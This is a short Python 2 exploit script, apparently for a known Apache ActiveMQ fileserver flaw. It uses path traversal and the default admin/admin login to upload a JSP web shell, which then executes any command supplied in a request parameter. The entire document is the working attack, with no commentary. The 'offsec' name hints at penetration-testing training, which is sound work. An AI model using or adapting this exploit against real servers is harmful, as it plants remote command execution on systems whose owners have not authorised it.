import requests

url = "http://127.0.0.1:8161/fileserver/..\\admin\\offsec.jsp"
data = '<%= Runtime.getRuntime().exec(request.getParameter("c")) %>'
print requests.put(url, data=data, auth=('admin', 'admin')).text
